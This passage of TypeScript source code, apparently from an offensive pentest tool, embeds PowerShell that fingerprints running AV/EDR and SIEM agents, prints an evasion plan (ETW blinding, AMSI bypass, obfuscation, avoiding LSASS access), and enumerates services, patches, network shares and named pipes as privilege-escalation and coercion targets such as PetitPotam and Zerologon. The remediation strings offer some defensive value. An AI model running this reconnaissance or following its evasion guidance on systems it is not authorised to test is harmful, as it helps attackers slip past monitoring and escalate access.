    'CbDefense' = @{ Name = 'VMware Carbon Black Cloud'; Type = 'EDR'; Risk = 'HIGH' }
    'CbDefenseService' = @{ Name = 'Carbon Black Defense Service'; Type = 'EDR'; Risk = 'HIGH' }
    'RepMgr' = @{ Name = 'Carbon Black Response'; Type = 'EDR'; Risk = 'HIGH' }
    'SophosMcsAgent' = @{ Name = 'Sophos Central'; Type = 'EDR'; Risk = 'HIGH' }
    'SAVService' = @{ Name = 'Sophos AV'; Type = 'AV'; Risk = 'MEDIUM' }
    'CylanceSvc' = @{ Name = 'Cylance (BlackBerry)'; Type = 'AI-AV'; Risk = 'HIGH' }
    'TmListen' = @{ Name = 'Trend Micro Apex One'; Type = 'EDR'; Risk = 'HIGH' }
    'Ntrtscan' = @{ Name = 'Trend Micro OfficeScan'; Type = 'AV'; Risk = 'MEDIUM' }
    'ekrn' = @{ Name = 'ESET NOD32'; Type = 'AV'; Risk = 'MEDIUM' }
    'ERAAgent' = @{ Name = 'ESET Remote Agent'; Type = 'AV'; Risk = 'MEDIUM' }
    'McAfeeFramework' = @{ Name = 'McAfee/Trellix'; Type = 'AV'; Risk = 'MEDIUM' }
    'mfetp' = @{ Name = 'McAfee Endpoint Threat Prevention'; Type = 'EDR'; Risk = 'HIGH' }
    'ccSvcHst' = @{ Name = 'Symantec/Broadcom Endpoint'; Type = 'AV'; Risk = 'MEDIUM' }
    'SepMasterService' = @{ Name = 'Symantec SEP'; Type = 'AV'; Risk = 'MEDIUM' }
    'CortexXDR' = @{ Name = 'Palo Alto Cortex XDR'; Type = 'EDR'; Risk = 'CRITICAL' }
    'cyserver' = @{ Name = 'Palo Alto Cortex (Cybereason)'; Type = 'EDR'; Risk = 'CRITICAL' }
    'WinDefend' = @{ Name = 'Windows Defender Service'; Type = 'AV'; Risk = 'MEDIUM' }
    'EventTracker' = @{ Name = 'EventTracker SIEM Agent'; Type = 'SIEM'; Risk = 'MEDIUM' }
    'splunkd' = @{ Name = 'Splunk Universal Forwarder'; Type = 'SIEM'; Risk = 'MEDIUM' }
    'winlogbeat' = @{ Name = 'Elastic Winlogbeat'; Type = 'SIEM'; Risk = 'MEDIUM' }
    'ossec' = @{ Name = 'OSSEC/Wazuh Agent'; Type = 'HIDS'; Risk = 'MEDIUM' }
}

$detected = @()
$procs = Get-Process -ErrorAction SilentlyContinue | Select-Object -Property ProcessName, Id, Path -Unique
$services = Get-Service -ErrorAction SilentlyContinue

foreach ($key in $avProducts.Keys) {
    $proc = $procs | Where-Object { $_.ProcessName -eq $key }
    $svc = $services | Where-Object { $_.Name -eq $key -and $_.Status -eq 'Running' }
    if ($proc -or $svc) {
        $info = $avProducts[$key]
        $detected += [PSCustomObject]@{
            Product = $info.Name
            Type = $info.Type
            Risk = $info.Risk
            PID = if ($proc) { $proc.Id } else { 'N/A (service)' }
            Status = 'RUNNING'
        }
    }
}

if ($detected.Count -gt 0) {
    Write-Output "[!] DETECTED SECURITY PRODUCTS ($($detected.Count)):"
    Write-Output ""
    foreach ($d in $detected | Sort-Object Risk -Descending) {
        Write-Output "    [$($d.Risk)] $($d.Product) ($($d.Type)) — PID: $($d.PID)"
    }
} else {
    Write-Output "[+] No known AV/EDR products detected"
}

Write-Output ""
Write-Output "=== Windows Security Status ==="
try {
    $mpStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
    if ($mpStatus) {
        Write-Output "[*] Defender RealTime Protection: $($mpStatus.RealTimeProtectionEnabled)"
        Write-Output "[*] Defender AntiSpyware: $($mpStatus.AntispywareEnabled)"
        Write-Output "[*] Defender Tamper Protection: $($mpStatus.IsTamperProtected)"
        Write-Output "[*] Defender Cloud Protection: $($mpStatus.IoavProtectionEnabled)"
        Write-Output "[*] Defender Behavior Monitor: $($mpStatus.BehaviorMonitorEnabled)"
    }
} catch {}

$fw = Get-NetFirewallProfile -ErrorAction SilentlyContinue
if ($fw) {
    Write-Output ""
    Write-Output "=== Firewall Profiles ==="
    foreach ($profile in $fw) {
        Write-Output "    $($profile.Name): $(if ($profile.Enabled) { 'ENABLED' } else { 'DISABLED' })"
    }
}

Write-Output ""
Write-Output "=== Recommended Evasion Strategy ==="
$hasEDR = $detected | Where-Object { $_.Type -eq 'EDR' }
$hasCritical = $detected | Where-Object { $_.Risk -eq 'CRITICAL' }
if ($hasCritical) {
    Write-Output "[!] CRITICAL EDR detected — use winhook ps_downgrade first"
    Write-Output "[!] Consider: etw_blind -> amsi_bypass -> --stealth obfuscate --pwsh"
    Write-Output "[!] Avoid: direct LSASS access, CreateRemoteThread, suspicious parent-child"
} elseif ($hasEDR) {
    Write-Output "[!] EDR detected — use winhook etw_blind + amsi_bypass before operations"
    Write-Output "[*] Use --stealth amsi for all commands"
} elseif ($detected.Count -gt 0) {
    Write-Output "[*] AV only — winhook amsi_bypass should be sufficient"
    Write-Output "[*] Use --stealth base64 for command-line logging evasion"
} else {
    Write-Output "[+] No protection detected — direct execution safe"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-RECON-001",
      provider: "windows",
      severity: "info",
      status: "ENUMERATED",
      resource: "host://av-edr",
      title: "AV/EDR product detection and evasion strategy recommendation",
      details: r.stdout.substring(0, 500),
      remediation: "Ensure EDR agents are tamper-protected and cannot be disabled by local admins.",
    })
  }

  if (action === "software" || action === "full") {
    const script = `
Write-Output "=== Installed Software ==="
$apps = @()
$regPaths = @(
    "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*",
    "HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*",
    "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*"
)
foreach ($path in $regPaths) {
    $apps += Get-ItemProperty $path -ErrorAction SilentlyContinue |
        Where-Object { $_.DisplayName } |
        Select-Object DisplayName, DisplayVersion, Publisher, InstallDate
}
$apps = $apps | Sort-Object DisplayName -Unique

Write-Output "[*] Total installed applications: $($apps.Count)"
Write-Output ""

$interesting = @('Python','Git','Visual Studio','Node','Java','Docker','WSL','VPN','Remote','TeamViewer','AnyDesk','PuTTY','WinSCP','FileZilla','7-Zip','Wireshark','Nmap','Burp','Postman','Chrome','Firefox','KeePass','1Password','Bitwarden','OpenSSH','Cygwin','MSYS','MinGW')
$found = $apps | Where-Object { $name = $_.DisplayName; $interesting | Where-Object { $name -match $_ } }
if ($found) {
    Write-Output "[!] Interesting software:"
    foreach ($f in $found) {
        Write-Output "    $($f.DisplayName) v$($f.DisplayVersion)"
    }
}

Write-Output ""
Write-Output "=== .NET / PowerShell Versions ==="
$dotnetVersions = Get-ChildItem "HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP" -Recurse -ErrorAction SilentlyContinue |
    Get-ItemProperty -Name Version -ErrorAction SilentlyContinue |
    Select-Object -ExpandProperty Version -Unique | Sort-Object
Write-Output "[*] .NET versions: $($dotnetVersions -join ', ')"
Write-Output "[*] PowerShell: $($PSVersionTable.PSVersion)"
Write-Output "[*] CLR: $($PSVersionTable.CLRVersion)"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-RECON-002",
      provider: "windows",
      severity: "info",
      status: "ENUMERATED",
      resource: "host://software",
      title: "Installed software and attack surface enumeration",
      details: `${r.stdout.substring(0, 400)} — Review application names and versions in the output — for any with a version, check CVE database via cve-mcp (cve search_by_product --product <name> --version <ver>). If cve-mcp is not enabled: cyberstrike mcp enable cve`,
      remediation: "Remove unnecessary software. Audit remote access tools. Update vulnerable versions.",
    })
  }

  if (action === "services" || action === "full") {
    const script = `
Write-Output "=== Running Services ==="
$services = Get-Service | Where-Object { $_.Status -eq 'Running' } | Sort-Object DisplayName

Write-Output "[*] Running services: $($services.Count)"
Write-Output ""

$vulnServices = @()
foreach ($svc in $services) {
    try {
        $wmiSvc = Get-WmiObject Win32_Service -Filter "Name='$($svc.Name)'" -ErrorAction SilentlyContinue
        if ($wmiSvc) {
            $binPath = $wmiSvc.PathName
            $startName = $wmiSvc.StartName
            if ($startName -match 'LocalSystem|SYSTEM') {
                if ($binPath -and $binPath -notmatch '^"' -and $binPath -match ' ') {
                    $vulnServices += [PSCustomObject]@{
                        Name = $svc.Name
                        Display = $svc.DisplayName
                        RunAs = $startName
                        Issue = 'Unquoted path with spaces'
                        Path = $binPath
                    }
                }
            }
        }
    } catch {}
}

if ($vulnServices) {
    Write-Output "[!] Potentially vulnerable services:"
    foreach ($v in $vulnServices) {
        Write-Output "    [$($v.Issue)] $($v.Name) — $($v.RunAs)"
        Write-Output "    Path: $($v.Path)"
    }
} else {
    Write-Output "[*] No obviously vulnerable service configurations found"
}

Write-Output ""
Write-Output "[*] Services running as SYSTEM:"
$systemServices = Get-WmiObject Win32_Service -Filter "State='Running' AND StartName='LocalSystem'" -ErrorAction SilentlyContinue |
    Select-Object -First 20
foreach ($s in $systemServices) {
    Write-Output "    $($s.Name) — $($s.DisplayName)"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-RECON-003",
      provider: "windows",
      severity: "info",
      status: "ENUMERATED",
      resource: "host://services",
      title: "Running services and vulnerable service configuration enumeration",
      details: `${r.stdout.substring(0, 400)} — Review service names and versions — for any with a version, check CVE database via cve-mcp (cve search_by_product --product <name> --version <ver>). If cve-mcp is not enabled: cyberstrike mcp enable cve`,
      remediation: "Quote all service binary paths. Run services with least privilege. Update vulnerable versions.",
    })
  }

  if (action === "network" || action === "full") {
    const script = `
Write-Output "=== Network Interfaces ==="
Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
    Where-Object { $_.IPAddress -ne '127.0.0.1' } |
    ForEach-Object { Write-Output "    $($_.InterfaceAlias): $($_.IPAddress)/$($_.PrefixLength)" }

Write-Output ""
Write-Output "=== Active Connections ==="
$connections = Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue |
    Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess |
    Sort-Object RemoteAddress -Unique | Select-Object -First 30
foreach ($c in $connections) {
    $proc = Get-Process -Id $c.OwningProcess -ErrorAction SilentlyContinue
    Write-Output "    $($c.LocalAddress):$($c.LocalPort) -> $($c.RemoteAddress):$($c.RemotePort) [$($proc.ProcessName)]"
}

Write-Output ""
Write-Output "=== Listening Ports ==="
Get-NetTCPConnection -State Listen -ErrorAction SilentlyContinue |
    Sort-Object LocalPort | Select-Object -First 20 |
    ForEach-Object {
        $proc = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue
        Write-Output "    :$($_.LocalPort) [$($proc.ProcessName)]"
    }

Write-Output ""
Write-Output "=== DNS Cache (recent lookups) ==="
Get-DnsClientCache -ErrorAction SilentlyContinue |
    Select-Object -First 20 |
    ForEach-Object { Write-Output "    $($_.Entry) -> $($_.Data)" }

Write-Output ""
Write-Output "=== Network Shares ==="
Get-SmbShare -ErrorAction SilentlyContinue |
    Where-Object { $_.Name -notmatch '\\$' } |
    ForEach-Object { Write-Output "    $($_.Name): $($_.Path) — $($_.Description)" }
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-RECON-004",
      provider: "windows",
      severity: "info",
      status: "ENUMERATED",
      resource: "host://network",
      title: "Network interfaces, connections, listening ports, and shares",
      details: r.stdout.substring(0, 500),
      remediation: "Close unnecessary listening ports. Disable unused SMB shares.",
    })
  }

  if (action === "hotfixes" || action === "full") {
    const script = `
Write-Output "=== Installed Hotfixes ==="
$hotfixes = Get-HotFix -ErrorAction SilentlyContinue | Sort-Object InstalledOn -Descending
Write-Output "[*] Total hotfixes: $($hotfixes.Count)"
Write-Output "[*] Last update: $(($hotfixes | Select-Object -First 1).InstalledOn)"
Write-Output ""

$recent = $hotfixes | Select-Object -First 10
foreach ($h in $recent) {
    Write-Output "    $($h.HotFixID) — $($h.Description) — $($h.InstalledOn)"
}

$daysSinceUpdate = ((Get-Date) - ($hotfixes | Select-Object -First 1).InstalledOn).Days
Write-Output ""
if ($daysSinceUpdate -gt 90) {
    Write-Output "[!] System is $daysSinceUpdate days behind on updates — likely missing security patches"
} elseif ($daysSinceUpdate -gt 30) {
    Write-Output "[*] Last update was $daysSinceUpdate days ago"
} else {
    Write-Output "[+] System is relatively up to date ($daysSinceUpdate days)"
}

Write-Output ""
Write-Output "=== OS Version ==="
$os = Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue
Write-Output "[*] $($os.Caption) $($os.Version) Build $($os.BuildNumber)"
Write-Output "[*] Architecture: $($os.OSArchitecture)"
Write-Output "[*] Install Date: $($os.ConvertToDateTime($os.InstallDate))"
Write-Output "[*] Last Boot: $($os.ConvertToDateTime($os.LastBootUpTime))"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-RECON-005",
      provider: "windows",
      severity: "info",
      status: "ENUMERATED",
      resource: "host://hotfixes",
      title: "Installed hotfixes and patch level assessment",
      details: `${r.stdout.substring(0, 400)} — Review OS build and missing KBs — check CVE database via cve-mcp (cve search_by_product --product windows --version <build>) for known exploits. If cve-mcp is not enabled: cyberstrike mcp enable cve`,
      remediation: "Keep systems patched. Enable automatic updates. Apply missing critical patches.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function pipeEnum(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const filter = argVal(args, "--filter")
  const findings: Finding[] = []
  const output: string[] = ["[*] Named pipe enumeration...\n"]

  if (activeExec === "cmd" || activeExec === "bat") {
    const dirPipes = await cmd("dir \\\\.\\pipe\\ /b", timeout)
    if (dirPipes.exitCode === 0) {
      const pipes = dirPipes.stdout.trim().split("\n").filter(Boolean)
      output.push(`[*] Total named pipes: ${pipes.length} (cmd.exe dir)`)
      const securityPipes = [
        { pattern: "lsass", desc: "LSASS — credential extraction target", risk: "HIGH" },
        { pattern: "spoolss", desc: "Print Spooler — PrinterBug coercion", risk: "HIGH" },
        { pattern: "efsrpc", desc: "EFS RPC — PetitPotam coercion", risk: "HIGH" },
        { pattern: "netlogon", desc: "Netlogon — Zerologon target", risk: "HIGH" },
        { pattern: "samr", desc: "SAM Remote — user enumeration", risk: "MEDIUM" },
        { pattern: "svcctl", desc: "Service Control Manager", risk: "MEDIUM" },
        { pattern: "atsvc", desc: "Task Scheduler — remote task creation", risk: "MEDIUM" },
        { pattern: "winreg", desc: "Remote Registry", risk: "MEDIUM" },
        { pattern: "FssagentRpc", desc: "File Server VSS — ShadowCoerce", risk: "HIGH" },
        { pattern: "SQLLocal", desc: "SQL Server local pipe", risk: "MEDIUM" },
        { pattern: "dnsserver", desc: "DNS Server — DnsAdmin abuse", risk: "HIGH" },
      ]
      output.push("\n[!] Security-relevant pipes:")
      for (const sp of securityPipes) {
        const matched = pipes.filter((p) => p.toLowerCase().includes(sp.pattern.toLowerCase()))
        for (const m of matched) output.push(`    [${sp.risk}] ${m}\n         ${sp.desc}`)
      }
      if (action === "custom") {
        const systemPipes = [
          "lsass",
          "ntsvcs",
          "scerpc",
          "spoolss",
          "efsrpc",
          "netlogon",
          "samr",
          "srvsvc",
          "svcctl",
          "wkssvc",
          "winreg",
          "browser",
          "eventlog",
          "InitShutdown",
          "LSM_API",
          "ROUTER",
          "W32TIME",
          "Winsock2",
          "atsvc",
          "trkwks",
          "TSVCPIPE",
          "TermSrv",
        ]
        const custom = pipes.filter((p) => !systemPipes.some((sp) => p.toLowerCase().includes(sp.toLowerCase())))
        output.push(`\n=== Custom/Non-Standard Pipes (${custom.length}) ===`)
        for (const c of custom.slice(0, 50)) output.push(`    ${c}`)
        output.push("\n[*] Look for: C2 framework pipes (msagent_, MSSE-, postex_, beacon)")
      }
      if (filter) {
        const filtered = pipes.filter((p) => p.toLowerCase().includes(filter.toLowerCase()))
        output.push(`\n=== Filtered (${filter}): ${filtered.length} ===`)
        for (const f of filtered) output.push(`    ${f}`)
      }
      findings.push({
        checkId: "WIN-RECON-010",
        provider: "windows",
        severity: "info",
        status: "ENUMERATED",
        resource: "host://named-pipes",
        title: "Named pipe enumeration via cmd.exe dir",
        details: `${pipes.length} pipes found`,
        remediation: "Restrict pipe ACLs.",
      })
    }
    if (action === "acl") {
      output.push("\n[!] Pipe ACL analysis requires PowerShell/.NET — use --exec ps")
      output.push("[*] Basic pipe connectivity can be tested with: echo test > \\\\.\\pipe\\PIPENAME")
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "enum" || action === "full") {
    const script = `
Write-Output "=== Named Pipes ==="
$pipes = [System.IO.Directory]::GetFiles('\\\\.\\pipe\\')
Write-Output "[*] Total named pipes: $($pipes.Count)"
Write-Output ""

$interesting = @(
    @{ Pattern = 'lsass'; Desc = 'LSASS — credential extraction target'; Risk = 'HIGH' },
    @{ Pattern = 'spoolss'; Desc = 'Print Spooler — PrinterBug/SpoolSample coercion'; Risk = 'HIGH' },
    @{ Pattern = 'efsrpc'; Desc = 'EFS RPC — PetitPotam coercion'; Risk = 'HIGH' },
    @{ Pattern = 'netlogon'; Desc = 'Netlogon — Zerologon target'; Risk = 'HIGH' },
    @{ Pattern = 'samr'; Desc = 'SAM Remote — user enumeration'; Risk = 'MEDIUM' },
    @{ Pattern = 'srvsvc'; Desc = 'Server Service — share enumeration'; Risk = 'LOW' },
    @{ Pattern = 'wkssvc'; Desc = 'Workstation Service — domain info'; Risk = 'LOW' },
    @{ Pattern = 'atsvc'; Desc = 'Task Scheduler — remote task creation'; Risk = 'MEDIUM' },
    @{ Pattern = 'svcctl'; Desc = 'Service Control Manager — remote service management'; Risk = 'MEDIUM' },
    @{ Pattern = 'winreg'; Desc = 'Remote Registry — registry access'; Risk = 'MEDIUM' },
    @{ Pattern = 'FssagentRpc'; Desc = 'File Server VSS — ShadowCoerce'; Risk = 'HIGH' },
    @{ Pattern = 'msagent'; Desc = 'SQL Agent — MSSQL lateral movement'; Risk = 'MEDIUM' },
    @{ Pattern = 'SQLLocal'; Desc = 'SQL Server local pipe — database access'; Risk = 'MEDIUM' },
    @{ Pattern = 'dnsserver'; Desc = 'DNS Server — DnsAdmin abuse target'; Risk = 'HIGH' },
    @{ Pattern = 'cert'; Desc = 'Certificate Services — ADCS target'; Risk = 'MEDIUM' },
    @{ Pattern = 'TSVCPIPE'; Desc = 'Terminal Services — RDP session'; Risk = 'MEDIUM' }
)

Write-Output "[!] Security-relevant pipes:"
Write-Output ""
foreach ($item in $interesting) {
    $found = $pipes | Where-Object { $_ -match $item.Pattern }
    if ($found) {
        foreach ($p in $found) {
            $name = $p.Replace('\\\\.\\pipe\\', '')
            Write-Output "    [$($item.Risk)] $name"
            Write-Output "         $($item.Desc)"
        }
    }
}

$filterVal = '${filter || ""}'
if ($filterVal) {
    Write-Output ""
    Write-Output "=== Filtered Pipes (pattern: $filterVal) ==="
    $filtered = $pipes | Where-Object { $_ -match $filterVal }
    foreach ($p in $filtered) {
        Write-Output "    $($p.Replace('\\\\.\\pipe\\', ''))"
    }
    Write-Output "[*] Matched: $($filtered.Count)"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-RECON-010",
      provider: "windows",
      severity: "info",
      status: "ENUMERATED",
      resource: "host://named-pipes",
      title: "Named pipe enumeration for attack surface discovery",
      details: r.stdout.substring(0, 500),
      remediation: "Disable unnecessary named pipes. Restrict pipe ACLs to authorized users only.",
    })
  }

  if (action === "acl" || action === "full") {
    const target = filter || "spoolss"
    const script = `
Write-Output "=== Named Pipe ACL Analysis ==="
Write-Output "[*] Checking pipe: ${target}"
Write-Output ""

try {
    $pipe = New-Object System.IO.Pipes.NamedPipeClientStream(".", "${target}", [System.IO.Pipes.PipeDirection]::InOut, [System.IO.Pipes.PipeOptions]::None)
    $pipe.Connect(3000)
    Write-Output "[+] Successfully connected to pipe — accessible to current user"
    $pipe.Close()
    $pipe.Dispose()
} catch {
    Write-Output "[-] Cannot connect: $($_.Exception.Message)"
}

Write-Output ""
Write-Output "=== Impersonation-Capable Pipes ==="
Write-Output "[*] SYSTEM-owned pipes (impersonation targets):"
Get-ChildItem '\\\\.\\pipe\\' -ErrorAction SilentlyContinue | Select-Object -First 40 | ForEach-Object {
    Write-Output "    $($_.Name)"
}
Write-Output ""
Write-Output "[*] Use named_pipe_privesc to exploit impersonation on target pipes"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-RECON-011",
      provider: "windows",
      severity: "medium",
      status: "ENUMERATED",
      resource: `host://pipe/${target}`,
      title: "Named pipe ACL analysis for impersonation targeting",
      details: r.stdout.substring(0, 500),
      remediation: "Restrict named pipe creation permissions. Monitor pipe server creation for impersonation attacks.",
    })
  }

  if (action === "custom") {
    const script = `
Write-Output "=== Custom/Non-Standard Pipes ==="
$systemPipes = @('lsass','ntsvcs','scerpc','spoolss','efsrpc','netlogon','samr','srvsvc','svcctl','wkssvc','winreg','browser','eventlog','PIPE_EVENTROOT','InitShutdown','LSM_API','ROUTER','W32TIME','Winsock2','atsvc','trkwks','DAV RPC','protected_storage','MsFteWds','TSVCPIPE','TermSrv','Ctx')

$pipes = [System.IO.Directory]::GetFiles('\\\\.\\pipe\\')
$custom = $pipes | ForEach-Object {
    $name = $_.Replace('\\\\.\\pipe\\', '')
    $isSystem = $false
    foreach ($sp in $systemPipes) {
        if ($name -match $sp) { $isSystem = $true; break }
    }
    if (-not $isSystem) { $name }
}

Write-Output "[*] Custom/third-party pipes ($($custom.Count)):"
foreach ($c in ($custom | Sort-Object | Select-Object -First 50)) {
    Write-Output "    $c"
}

Write-Output ""
Write-Output "[*] Look for: C2 framework pipes, RAT pipes, custom app pipes with weak ACLs"
Write-Output "[*] Common C2 pipes: msagent_, MSSE-, postex_, beacon"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-RECON-012",
      provider: "windows",
      severity: "info",
      status: "ENUMERATED",
      resource: "host://custom-pipes",
      title: "Custom named pipe discovery for C2 and third-party application detection",
      details: r.stdout.substring(0, 500),
      remediation: "Investigate unknown named pipes. Monitor for C2 framework pipe patterns.",
    })
  }

  return { output: output.join("\n"), findings }
}
